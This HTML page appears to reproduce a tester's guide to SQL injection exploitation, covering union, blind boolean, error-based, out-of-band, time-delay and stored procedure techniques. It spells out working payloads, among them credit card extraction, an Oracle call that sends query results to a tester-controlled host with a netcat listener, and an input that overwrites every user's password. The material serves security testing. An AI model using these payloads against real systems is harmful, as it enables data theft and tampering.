<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Exploitation Techniques</title>
</head><body><b>Exploitation Techniques</b><br/>
<b>Union Exploitation Technique</b><br/>
<br/>
The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose for our examples that the query executed from the server is the following:<br/>
SELECT Name, Phone, Address FROM Users WHERE Id=$id<br/>
<br/>
We will set the following $id value:<br/>
$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable<br/>
<br/>
We will have the following query:<br/>
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable<br/>
<br/>
Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword ALL is necessary to get around queries that use the keyword DISTINCT. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns in order to avoid a syntax error.<br/>
<br/>
The first detail a tester needs to exploit the SQL injection vulnerability using such technique is to find the right numbers of columns in the SELECT statement.<br/>
<br/>
In order to achieve this the tester can use ORDER BY clause followed by a number indicating the numeration of database’s column selected:<br/>
http://www.example.com/product.php?id=10 ORDER BY 10--<br/>
<br/>
If the query executes with success the tester can assume, in this example, there are 10 or more columns in the SELECT statement. If the query fails then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:<br/>
<br/>
Unknown column '10' in 'order clause'<br/>
<br/>
After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:<br/>
http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--<br/>
<br/>
<br/>
If the query fails, the tester will probably see a message like:<br/>
All cells in a column must have the same datatype<br/>
<br/>
If the query executes with success, the first column can be an integer. Then the tester can move further and so on:<br/>
http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--<br/>
<br/>
<br/>
After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a LIMIT clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database which ID is 99999):<br/>
<br/>
http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--<br/>
<br/>
<br/>
<br/>
<b>Boolean Exploitation Technique</b><br/>
<br/>
The Boolean exploitation technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).<br/>
<br/>
By using inference methods, it is possible to avoid this obstacle and thus to succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named id vulnerable to SQL injection. This means that carrying out the following request:<br/>
<br/>
<br/>
http://www.example.com/index.php?id=1'<br/>
<br/>
We will get one page with a custom message error which is due to a syntactic error in the query. We suppose that the query executed on the server is:<br/>
SELECT field1, field2, field3 FROM Users WHERE Id='$Id' <br/>
<br/>
<br/>
Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our examples, we will use the following pseudo-functions:<br/>
<br/>
SUBSTRING (text, start, length): returns a substring starting from the position "start" of text and of length "length". If "start" is greater than the length of text, the function returns a null value.<br/>
<br/>
ASCII (char): it gives back ASCII value of the input character. A null value is returned if char is 0.<br/>
<br/>
LENGTH (text): it gives back the number of characters in the input text.<br/>
<br/>
Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, in order to select only one character at a time (selecting a single character means to impose the length parameter to 1), and the function ASCII, in order to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table, until the right value is found. As an example, we will use the following value for Id:<br/>
$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 <br/>
<br/>
<br/>
That creates the following query (from now on, we will call it "inferential query"):<br/>
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'<br/>
<br/>
The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for Id:<br/>
$Id=1' AND '1' = '2 <br/>
<br/>
<br/>
Which will create the following query:<br/>
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' <br/>
<br/>
The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and to obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates in order to decide the result of the test.<br/>
<br/>
In the previous discussion, we haven't dealt with the problem of determining the termination condition for out tests, i.e., when we should end the inference procedure. A techniques to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e., the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.<br/>
<br/>
We will insert the following value for the field Id:<br/>
$Id=1' AND LENGTH(username)=N AND '1' = '1 <br/>
<br/>
Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:<br/>
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1' <br/>
<br/>
<br/>
The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.<br/>
<br/>
<br/>
The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.<br/>
<br/>
<br/>
<br/>
<b>Error based Exploitation technique</b><br/>
<br/>
An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).<br/>
<br/>
<br/>
Consider the following SQL query:<br/>
SELECT * FROM products WHERE id_product=$id_product<br/>
<br/>
Consider also the request to a script who executes the query above:<br/>
http://www.example.com/product.php?id=10<br/>
<br/>
The malicious request would be (e.g. Oracle 10g):<br/>
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--<br/>
<br/>
In this example, the tester is concatenating the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME. This Oracle function will try to return the host name of the parameter passed to it, which is other query, the name of the user. When the database looks for a host name with the user database name, it will fail and return an error message like:<br/>
<br/>
ORA-292257: host SCOTT unknown<br/>
<br/>
Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.<br/>
<br/>
<br/>
<br/>
<br/>
<b>Out of band Exploitation technique</b><br/>
<br/>
This technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.<br/>
<br/>
Consider the following SQL query:<br/>
SELECT * FROM products WHERE id_product=$id_product<br/>
<br/>
Consider also the request to a script who executes the query above:<br/>
http://www.example.com/product.php?id=10<br/>
<br/>
The malicious request would be:<br/>
http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--<br/>
<br/>
In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request. This Oracle function will try to connect to ‘testerserver’ and make a HTTP GET request containing the return from the query “SELECT user FROM DUAL”. The tester can set up a webserver (e.g. Apache) or use the Netcat tool:<br/>
<br/>
/home/tester/nc –nLp 80<br/>
&nbsp;<br/>
GET /SCOTT HTTP/1.1<br/>
Host: testerserver.com<br/>
Connection: close<br/>
<br/>
<br/>
<br/>
<br/>
<b>Time delay Exploitation technique</b><br/>
<br/>
The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).<br/>
<br/>
<br/>
Consider the following SQL query:<br/>
SELECT * FROM products WHERE id_product=$id_product<br/>
<br/>
Consider also the request to a script who executes the query above:<br/>
http://www.example.com/product.php?id=10<br/>
<br/>
The malicious request would be (e.g. MySql 5.x):<br/>
http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--<br/>
<br/>
In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.<br/>
Stored Procedure Injection<br/>
<br/>
When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.<br/>
<br/>
<br/>
Consider the following SQL Server Stored Procedure:<br/>
Create procedure user_login @username varchar(20), @passwd varchar(20) <br/>
As<br/>
Declare @sqlstring varchar(250)<br/>
Set @sqlstring &nbsp;= ‘<br/>
Select 1 from users<br/>
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd<br/>
exec(@sqlstring)<br/>
Go<br/>
<br/>
<br/>
User input:<br/>
anyusername or 1=1'<br/>
anypassword<br/>
<br/>
This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.<br/>
<br/>
NOTE: This example may seem unlikely due to the use of dynamic SQL to log in a user, but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.<br/>
<br/>
<br/>
Consider the following SQL Server Stored Procedure:<br/>
Create<br/>
procedure get_report @columnamelist varchar(7900)<br/>
As<br/>
Declare @sqlstring varchar(8000)<br/>
Set @sqlstring &nbsp;= ‘<br/>
Select ‘ + @columnamelist + ‘ from ReportTable‘<br/>
exec(@sqlstring)<br/>
Go<br/>
<br/>
User input:<br/>
1 from users; update users set password = 'password'; select *<br/>
<br/>
This will result in the report running and all users’ passwords being updated.<br/>
<br/>
<br/>
<br/>
<b>Automated Exploitation</b><br/>
<br/>
Most of the situation and techniques presented here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using SQLMap:<br/>
<br/>
https://www.owasp.org/index.php/Automated_Audit_using_SQLMap </body></html>